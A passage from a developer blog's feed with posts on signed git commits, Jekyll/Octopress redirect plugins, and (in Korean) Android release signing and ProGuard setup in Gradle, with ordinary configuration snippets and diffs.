</span><span class='line'><span class="o">[</span>master <span class="o">(</span>root-commit<span class="o">)</span> 6cdfc26<span class="o">]</span> Test commit of foo
</span><span class='line'> <span class="m">1</span> file changed, <span class="m">1</span> insertion<span class="o">(</span>+<span class="o">)</span>
</span><span class='line'> create mode <span class="m">100644</span> foo
</span></code></pre></td></tr></table></div></figure>


<p>After adding signed commits, you can see the signature of commits by using <code>--show-signature</code> option:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>git log --show-signature
</span><span class='line'>commit 6cdfc26eb2273fed14181fe4a09b6240323b8930
</span><span class='line'>gpg: Signature made 금  7/18 21:29:24 <span class="m">2014</span> KST using RSA key ID E79FBC2D
</span><span class='line'>gpg: Good signature from <span class="s2">&quot;John Doe &lt;john.doe@example.com&gt;&quot;</span>
</span><span class='line'>gpg:                 aka <span class="s2">&quot;keybase.io/jdoe &lt;jdoe@keybase.io&gt;&quot;</span>
</span><span class='line'>Author: John Doe &lt;john.doe@example.com&gt;
</span><span class='line'>Date:   Fri Jul <span class="m">18</span> 21:29:14 <span class="m">2014</span> +0900
</span><span class='line'>
</span><span class='line'>    Test commit of foo
</span><span class='line'>
</span><span class='line'> foo <span class="p">|</span> <span class="m">1</span> +
</span><span class='line'> <span class="m">1</span> file changed, <span class="m">1</span> insertion<span class="o">(</span>+<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>For more information, see <a href="http://mikegerwitz.com/papers/git-horror-story">A Git Horror Story: Repository Integrity With Signed Commits</a> by Mike Gerwitz.</p>

<h2><a id="contact-me"></a>Contact Me</h2>

<p>So, now feel free to contact me via <a href="https://keybase.io/yous">keybase.io/yous</a> and other <a href="http://yous.be/about">contacts</a>. The source of this site is available on <a href="https://github.com/yous/yous.github.io">GitHub</a>, forks and pull requests are welcome!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Introducing Source Han Sans: An open source Pan-CJK typeface &rarr;]]></title>
    <link href="http://yous.be/2014/07/16/introducing-source-han-sans-an-open-source-pan-cjk-typeface/"/>
    <updated>2014-07-16T16:04:27+09:00</updated>
    <id>http://yous.be/2014/07/16/introducing-source-han-sans-an-open-source-pan-cjk-typeface</id>
    <content type="html"><![CDATA[<blockquote><p>Adobe, in partnership with Google, is pleased to announce the release of <a href="http://adobe.ly/TkSHS">Source Han Sans</a>, a new open source Pan-CJK typeface family that is now available on Typekit for desktop use.</p>

<p><img src="http://typekit.files.wordpress.com/2014/07/multi-language-sample-v3.jpg?w=800&amp;h=408" alt="Multi-language sample" /></p>

<p>More information on Google&rsquo;s Noto Sans CJK family is available on their <a href="http://goo.gl/yhFcim">blog</a>.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Move to 'jekyll-redirect-from']]></title>
    <link href="http://yous.be/2014/07/09/move-to-jekyll-redirect-from/"/>
    <updated>2014-07-09T15:41:31+09:00</updated>
    <id>http://yous.be/2014/07/09/move-to-jekyll-redirect-from</id>
    <content type="html"><![CDATA[<h2><a id="problems-with-jekyll-alias-generator"></a>Problems with jekyll_alias_generator</h2>

<p>I wrote <a href="http://yous.be/2014/05/23/how-to-add-redirects-to-post-url-on-octopress/">&ldquo;How to Add Redirects to Post URL on Octopress&rdquo;</a> few month ago. Now <a href="https://github.com/imathis/octopress/commit/72ea6042e33f0b92e4923c3af00e923f19472573">Octopress is compatible</a> with <a href="http://jekyllrb.com">Jekyll</a> 2.0, and some plugins don&rsquo;t seem to work. Current Octopress uses Jekyll <a href="https://github.com/imathis/octopress/blob/4fdae37e4294618084f652c99c0c06ba7663ac07/Gemfile.lock#L26">2.0.3</a> and when I run <code>rake generate</code>, I see an error:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>/path/to/jekyll/lib/jekyll/static_file.rb:40:in <span class="sb">`</span>stat<span class="err">&#39;</span>: Not a directory @ rb_file_s_stat - /path/to/generated/alias/index.html/ <span class="o">(</span>Errno::ENOTDIR<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>So I make <a href="https://github.com/yous/jekyll_alias_generator/commit/7de96759bdd7a2c27fa2d4d603c6c1f585fd2abc">this commit</a>:</p>

<div><script src='https://gist.github.com/30d45925d0b100052f6d.js'></script>
<noscript><pre><code>diff --git a/_plugins/alias_generator.rb b/_plugins/alias_generator.rb
index 1d24cd8..50e9404 100644
--- a/_plugins/alias_generator.rb
+++ b/_plugins/alias_generator.rb
@@ -70,9 +70,10 @@ module Jekyll
           file.write(alias_template(destination_path))
         end
 
-        (alias_index_path.split(&#39;/&#39;).size + 1).times do |sections|
+        alias_index_path.split(&#39;/&#39;).size.times do |sections|
           @site.static_files &lt;&lt; Jekyll::AliasFile.new(@site, @site.dest, alias_index_path.split(&#39;/&#39;)[0, sections].join(&#39;/&#39;), &#39;&#39;)
         end
+        @site.static_files &lt;&lt; Jekyll::AliasFile.new(@site, @site.dest, alias_dir, alias_file)
       end
     end
 </code></pre></noscript></div>


<p>But it seems that there is <a href="https://github.com/tsmango/jekyll_alias_generator/issues/12">another problem</a> with latest Jekyll, so I make <a href="https://github.com/yous/jekyll_alias_generator/commit/59a72029307a730014a020dcb3f73506f80ddab5">another commit</a>:</p>

<div><script src='https://gist.github.com/ceb181878cf15b529e6d.js'></script>
<noscript><pre><code>diff --git a/_plugins/alias_generator.rb b/_plugins/alias_generator.rb
index 50e9404..76102db 100644
--- a/_plugins/alias_generator.rb
+++ b/_plugins/alias_generator.rb
@@ -56,13 +56,13 @@ module Jekyll
       alias_paths.compact!
 
       alias_paths.flatten.each do |alias_path|
-        alias_path = alias_path.to_s
+        alias_path = File.join(&#39;/&#39;, alias_path.to_s)
 
         alias_dir  = File.extname(alias_path).empty? ? alias_path : File.dirname(alias_path)
         alias_file = File.extname(alias_path).empty? ? &quot;index.html&quot; : File.basename(alias_path)
 
-        fs_path_to_dir   = File.join(@site.dest, alias_dir)
-        alias_index_path = File.join(alias_dir, alias_file)
+        fs_path_to_dir = File.join(@site.dest, alias_dir)
+        alias_sections = alias_dir.split(&#39;/&#39;)[1..-1]
 
         FileUtils.mkdir_p(fs_path_to_dir)
 
@@ -70,8 +70,8 @@ module Jekyll
           file.write(alias_template(destination_path))
         end
 
-        alias_index_path.split(&#39;/&#39;).size.times do |sections|
-          @site.static_files &lt;&lt; Jekyll::AliasFile.new(@site, @site.dest, alias_index_path.split(&#39;/&#39;)[0, sections].join(&#39;/&#39;), &#39;&#39;)
+        alias_sections.size.times do |sections|
+          @site.static_files &lt;&lt; Jekyll::AliasFile.new(@site, @site.dest, alias_sections[0, sections + 1].join(&#39;/&#39;), &#39;&#39;)
         end
         @site.static_files &lt;&lt; Jekyll::AliasFile.new(@site, @site.dest, alias_dir, alias_file)
       end</code></pre></noscript></div>


<p>To say the result first, I had <a href="https://github.com/yous/yous.github.io/commit/2cf44cbe21b499c89dc8ac68f6f170add52f9d6e">no luck</a>. The alias directories are generated, every <code>index.html</code> file under each directory won&rsquo;t. By looking at diff of <code>sitemap.xml</code>, the plugin seems to generate wrong paths. I&rsquo;m pretty newbie to Jekyll and how Octopress works with it. Also this is a plugin for Jekyll, not Octopress. So if you have any fix for this problem, please make pull requests to <a href="https://github.com/tsmango/jekyll_alias_generator/pulls">jekyll_alias_generator</a> or just <a href="http://yous.be/about/#contact">contact me</a>.</p>

<!-- more -->


<h2><a id="jekyll-redirect-from"></a>jekyll-redirect-from</h2>

<p>While searching how to fix this problem, I found <a href="https://github.com/jekyll/jekyll-redirect-from">jekyll-redirect-from</a> served by Jekyll team. What it does is almost completely same with <code>jekyll_alias_generator</code>. Generates alias HTML files when we set <code>redirect_from</code> key in YAML front matter of the post.</p>

<p>To use this plugin, install <code>jekyll-redirect-from</code> gem by select one option from below:</p>

<ul>
<li>Add <code>gem 'jekyll-redirect-from'</code> to <code>Gemfile</code> and execute <code>bundle</code>.</li>
<li>Run <code>gem install jekyll-redirect-from</code> on terminal.</li>
</ul>


<p>Then add it to your <code>_config.yml</code>:</p>

<figure class='code'><figcaption><span>_config.yml</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">gems</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">jekyll-redirect-from</span>
</span></code></pre></td></tr></table></div></figure>


<p>Ready to add redirects! You can use this by adding <code>redirect_from</code> to the YAML front matter of your page or post:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">redirect_from</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">/path/to/alias/</span>
</span><span class='line'>    <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">/path/to/another/alias</span>
</span></code></pre></td></tr></table></div></figure>


<p>You can also specify just one url:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">redirect_from</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/path/to/alias/</span>
</span></code></pre></td></tr></table></div></figure>


<p>Note that <code>/path/to/alias/</code> will generate a <code>/path/to/alias/index.html</code>, while <code>/path/to/alias</code> will generate a <code>/path/to/alias</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How to Add Redirects to Post URL on Octopress]]></title>
    <link href="http://yous.be/2014/05/23/how-to-add-redirects-to-post-url-on-octopress/"/>
    <updated>2014-05-23T14:56:44+09:00</updated>
    <id>http://yous.be/2014/05/23/how-to-add-redirects-to-post-url-on-octopress</id>
    <content type="html"><![CDATA[<p>When I write a new post on <a href="http://octopress.org">Octopress</a>, I share the link of it to somewhere doesn&rsquo;t support <a href="http://en.wikipedia.org/wiki/Hyperlink">hyperlinks</a>. Since people can&rsquo;t click the link, they should copy and paste or just type it letter by letter. I wanted to make it easier, so I maded short url for every post.</p>

<h2><a id="alias-generator-for-posts"></a>Alias Generator for Posts</h2>

<p>There is a <a href="http://jekyllrb.com">Jekyll</a> plugin that <a href="https://github.com/tsmango/jekyll_alias_generator">generates redirect pages for posts with aliases</a>. Octopress is based on Jekyll and this plugin has no compatibility problem. Its source is on GitHub, so I just added it as submodule:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>git submodule add git@github.com:tsmango/jekyll_alias_generator plugins/jekyll_alias_generator
</span></code></pre></td></tr></table></div></figure>


<p>In your <code>_config.yml</code>, you may have this line:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">plugins</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">plugins</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then it reads <code>plugins</code> directory and <code>alias_generator.rb</code> in <code>plugins/jekyll_alias_generator/_plugins/</code> directory is also loaded, so you can use and manage it!</p>

<h2><a id="how-to-use"></a>How to Use</h2>

<p>This plugin checks <code>alias</code> inside every post&rsquo;s YAML Front Matter. Just place the path of the alias:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="nn">---</span>
</span><span class='line'><span class="l-Scalar-Plain">layout</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">post</span>
</span><span class='line'><span class="l-Scalar-Plain">title</span><span class="p-Indicator">:</span> <span class="s">&quot;How</span><span class="nv"> </span><span class="s">to</span><span class="nv"> </span><span class="s">Add</span><span class="nv"> </span><span class="s">Redirects</span><span class="nv"> </span><span class="s">to</span><span class="nv"> </span><span class="s">Post</span><span class="nv"> </span><span class="s">URL</span><span class="nv"> </span><span class="s">on</span><span class="nv"> </span><span class="s">Octopress&quot;</span>
</span><span class='line'><span class="l-Scalar-Plain">alias</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/p/20140523</span>
</span><span class='line'><span class="nn">---</span>
</span></code></pre></td></tr></table></div></figure>


<p>Multiple aliases are also available:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="nn">---</span>
</span><span class='line'><span class="l-Scalar-Plain">layout</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">post</span>
</span><span class='line'><span class="l-Scalar-Plain">title</span><span class="p-Indicator">:</span> <span class="s">&quot;How</span><span class="nv"> </span><span class="s">to</span><span class="nv"> </span><span class="s">Add</span><span class="nv"> </span><span class="s">Redirects</span><span class="nv"> </span><span class="s">to</span><span class="nv"> </span><span class="s">Post</span><span class="nv"> </span><span class="s">URL</span><span class="nv"> </span><span class="s">on</span><span class="nv"> </span><span class="s">Octopress&quot;</span>
</span><span class='line'><span class="l-Scalar-Plain">alias</span><span class="p-Indicator">:</span> <span class="p-Indicator">[</span><span class="nv">/one-alias/index.html</span><span class="p-Indicator">,</span> <span class="nv">/another-alias/index.html</span><span class="p-Indicator">]</span>
</span><span class='line'><span class="nn">---</span>
</span></code></pre></td></tr></table></div></figure>


<p>When I <code>rake generate</code>, the plugin generates static html file at <code>/p/20140523/index.html</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span><span class='line'><span class="nt">&lt;html&gt;</span>
</span><span class='line'><span class="nt">&lt;head&gt;</span>
</span><span class='line'><span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">&quot;canonical&quot;</span> <span class="na">href=</span><span class="s">&quot;/2014/05/23/how-to-add-redirects-to-post-url-on-octopress/&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'><span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">&quot;content-type&quot;</span> <span class="na">content=</span><span class="s">&quot;text/html; charset=utf-8&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'><span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">&quot;refresh&quot;</span> <span class="na">content=</span><span class="s">&quot;0;url=/2014/05/23/how-to-add-redirects-to-post-url-on-octopress/&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'><span class="nt">&lt;/head&gt;</span>
</span><span class='line'><span class="nt">&lt;/html&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>When you go to <a href="http://yous.be/p/20140523">/p/20140523</a>, it will redirect here. It also has <a href="http://en.wikipedia.org/wiki/Canonical_link_element">canonical link</a>, so it won&rsquo;t affect search engine or web analysis services.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Gradle 환경에서 ProGuard 사용하기]]></title>
    <link href="http://yous.be/2014/05/15/how-to-configure-proguard-using-gradle/"/>
    <updated>2014-05-15T18:11:13+09:00</updated>
    <id>http://yous.be/2014/05/15/how-to-configure-proguard-using-gradle</id>
    <content type="html"><![CDATA[<h2><a id="gradle"></a>Gradle</h2>

<p><img src="http://www.gradle.org/img/gradle_logo.gif" alt="Gradle" /></p>

<p>최근 <a href="http://developer.android.com/sdk/installing/studio.html">Android Studio</a>를 통해 개발을 진행하게 되면서, 자연스럽게 <a href="http://www.gradle.org">Gradle</a>을 사용하게 되었다. <code>.gradle</code> 확장자를 가진 파일을 통해 빌드 설정을 자유롭게 조정할 수 있다. 이 글에서는 Gradle을 이용해 배포 APK를 생성하는 방법과 함께 <a href="http://proguard.sourceforge.net">ProGuard</a>를 사용법을 공유하겠다.</p>

<h2><a id="how-to-create-release-apk-using-gradle"></a>Gradle 환경에서 배포 APK 생성하기</h2>

<p>배포 APK에는 서명이 되어 있어야 하는데, 이를 위해서는 keystore 파일과 그 암호, 키 별칭, 키 암호가 필요하다. 디버그 APK에도 서명을 하지만, <a href="http://developer.android.com/tools/publishing/app-signing.html#debugmode">알려진 keystore 암호와 키 별칭, 키 암호</a>를 사용한다. 배포 APK의 서명을 위해 프로젝트의 <code>build.gradle</code> 파일에 다음 코드를 추가하면 된다.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='groovy'><span class='line'><span class="n">android</span> <span class="o">{</span>
</span><span class='line'>    <span class="c1">// ...</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">signingConfigs</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">release</span> <span class="o">{</span>
</span><span class='line'>            <span class="n">storeFile</span> <span class="nf">file</span><span class="o">(</span><span class="s2">&quot;YOUR_KEYSTORE_PATH&quot;</span><span class="o">)</span>
</span><span class='line'>            <span class="n">storePassword</span> <span class="s2">&quot;YOUR_KEYSTORE_PASSWORD&quot;</span>
</span><span class='line'>            <span class="n">keyAlias</span> <span class="s2">&quot;YOUR_KEY_ALIAS&quot;</span>
</span><span class='line'>            <span class="n">keyPassword</span> <span class="s2">&quot;YOUR_KEY_PASSWORD&quot;</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">buildTypes</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">release</span> <span class="o">{</span>
</span><span class='line'>            <span class="n">signingConfig</span> <span class="n">signingConfigs</span><span class="o">.</span><span class="na">release</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>이때 <code>buildTypes</code> 아래의 <code>debug</code> 항목은 굳이 명시하지 않아도 <a href="http://tools.android.com/tech-docs/new-build-system/user-guide#TOC-Build-Types">기본적으로 생성</a>되며, 이 <code>buildType</code>은 <a href="http://tools.android.com/tech-docs/new-build-system/user-guide#TOC-Signing-Configurations">디버그 keystore와 키를 사용하도록 설정</a>되어 있다.</p>

<p>다만 이 때 <code>build.gradle</code> 파일에 keystore 암호와 키 암호가 평문으로 들어가게 되는데, 소스를 공개하고 있는 등의 이유로 이를 피하고 싶다면 각각의 항목을 쉘 프롬프트에서 입력받을 수 있다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='groovy'><span class='line'><span class="n">signingConfigs</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">release</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">storeFile</span> <span class="nf">file</span><span class="o">(</span><span class="n">console</span><span class="o">.</span><span class="na">readLine</span><span class="o">(</span><span class="s2">&quot;\n\$ Enter keystore path: &quot;</span><span class="o">))</span>
</span><span class='line'>        <span class="n">storePassword</span> <span class="k">new</span> <span class="nf">String</span><span class="o">(</span><span class="n">console</span><span class="o">.</span><span class="na">readPassword</span><span class="o">(</span><span class="s2">&quot;\n\$ Enter keystore password: &quot;</span><span class="o">))</span>
</span><span class='line'>        <span class="n">keyAlias</span> <span class="n">console</span><span class="o">.</span><span class="na">readLine</span><span class="o">(</span><span class="s2">&quot;\n\$ Enter key alias: &quot;</span><span class="o">)</span>
</span><span class='line'>        <span class="n">keyPassword</span> <span class="k">new</span> <span class="nf">String</span><span class="o">(</span><span class="n">console</span><span class="o">.</span><span class="na">readPassword</span><span class="o">(</span><span class="s2">&quot;\n\$ Enter key password: &quot;</span><span class="o">))</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>그러나 이는 <a href="http://stackoverflow.com/questions/18328730/how-to-create-a-release-signed-apk-file-using-gradle#19210105">IDE를 통해 디버그 APK를 생성할 때 크래시</a>를 내며, 이는 그때 코드의 <code>console</code>이 <code>null</code>이라서 발생하는 오류다. 이를 해결한 최종 코드는 다음과 같다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='groovy'><span class='line'><span class="n">signingConfigs</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">release</span> <span class="o">{</span>
</span><span class='line'>        <span class="kd">final</span> <span class="n">Console</span> <span class="n">console</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="na">console</span><span class="o">();</span>
</span><span class='line'>        <span class="k">if</span> <span class="o">(</span><span class="n">console</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>            <span class="n">storeFile</span> <span class="nf">file</span><span class="o">(</span><span class="n">console</span><span class="o">.</span><span class="na">readLine</span><span class="o">(</span><span class="s2">&quot;\n\$ Enter keystore path: &quot;</span><span class="o">))</span>
</span><span class='line'>            <span class="n">storePassword</span> <span class="k">new</span> <span class="nf">String</span><span class="o">(</span><span class="n">console</span><span class="o">.</span><span class="na">readPassword</span><span class="o">(</span><span class="s2">&quot;\n\$ Enter keystore password: &quot;</span><span class="o">))</span>
</span><span class='line'>            <span class="n">keyAlias</span> <span class="n">console</span><span class="o">.</span><span class="na">readLine</span><span class="o">(</span><span class="s2">&quot;\n\$ Enter key alias: &quot;</span><span class="o">)</span>
</span><span class='line'>            <span class="n">keyPassword</span> <span class="k">new</span> <span class="nf">String</span><span class="o">(</span><span class="n">console</span><span class="o">.</span><span class="na">readPassword</span><span class="o">(</span><span class="s2">&quot;\n\$ Enter key password: &quot;</span><span class="o">))</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>디버그 APK와 배포 APK의 패키지 이름이 같으면 APK의 서명이 서로 달라 개발과 디버깅에 어려움이 있다. 이를 해결하기 위해서 <code>buildTypes</code> 아래에 <code>debug</code> 항목을 선언하여 디버그 APK의 패키지 이름을 바꿀 수 있고, 추가로 버전명도 바꿀 수 있다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='groovy'><span class='line'><span class="n">buildTypes</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">debug</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">packageNameSuffix</span> <span class="s1">&#39;.debug&#39;</span>
</span><span class='line'>        <span class="n">versionNameSuffix</span> <span class="s1">&#39;-debug&#39;</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>이제 터미널에서 다음 명령을 실행하면 디버그 APK와 배포 APK를 각각 얻을 수 있다. 물론 디버그 APK는 IDE로도 생성할 수 있다.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>./gradlew assembleDebug
</span><span class='line'><span class="nv">$ </span>./gradlew assembleRelease
</span></code></pre></td></tr></table></div></figure>


<p>Gradle은 <a href="http://tools.android.com/tech-docs/new-build-system/user-guide#TOC-Android-tasks">캐멀케이스 단축키를 지원</a>해서 <code>aR</code>에 해당하는 다른 명령이 없는 한 <code>assembleRelease</code> 대신 <code>aR</code>을 사용할 수 있다.</p>

<!-- more -->


<h2><a id="how-to-use-proguard"></a>ProGuard 사용하기</h2>

<p>배포 APK를 생성할 때 ProGuard를 사용할 수도 있는데, <code>build.gradle</code>에 다음 코드를 추가하면 된다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='groovy'><span class='line'><span class="n">buildTypes</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">release</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">runProguard</span> <span class="kc">true</span>
</span><span class='line'>        <span class="n">proguardFile</span> <span class="nf">getDefaultProguardFile</span><span class="o">(</span><span class="s1">&#39;proguard-android.txt&#39;</span><span class="o">)</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>getDefaultProguardFile()</code>는 <a href="http://tools.android.com/tech-docs/new-build-system/user-guide#TOC-Running-ProGuard">SDK에 위치한 해당 이름의 파일을 가져와 적용</a>한다. <code>proguard-android.txt</code>와 <code>proguard-android-optimize.txt</code>가 있으며 <a href="http://tools.android.com/tech-docs/new-build-system/user-guide#TOC-Running-ProGuard">앞의 것은 최적화를 수행하지 않고, 뒤의 것은 최적화를 수행</a>한다.</p>

<p>추가적인 다른 <code>proguardFile</code>을 더 적용하고 싶다면 <code>proguardFiles</code>를 사용하면 된다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='groovy'><span class='line'><span class="n">buildTypes</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">release</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">runProguard</span> <span class="kc">true</span>
</span><span class='line'>        <span class="n">proguardFiles</span> <span class="nf">getDefaultProguardFile</span><span class="o">(</span><span class="s1">&#39;proguard-android.txt&#39;</span><span class="o">),</span> <span class="s1">&#39;proguard-project.txt&#39;</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>다른 라이브러리 프로젝트를 가져다 사용하고 있을 경우, ProGuard 사용에 있어 주의해야 할 경우가 생긴다.</p>

<h3><a id="actionbarsherlock"></a>ActionBarSherlock</h3>

<p><a href="http://actionbarsherlock.com">ActionBarSherlock</a>의 경우 ProGuard를 사용할 때, <a href="http://actionbarsherlock.com/faq.html">다음 규칙을 추가하라고 명시</a>하고 있다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='groovy'><span class='line'><span class="o">-</span><span class="n">keep</span> <span class="kd">class</span> <span class="nc">android</span><span class="o">.</span><span class="na">support</span><span class="o">.</span><span class="na">v4</span><span class="o">.</span><span class="na">app</span><span class="o">.**</span> <span class="o">{</span> <span class="o">*;</span> <span class="o">}</span>
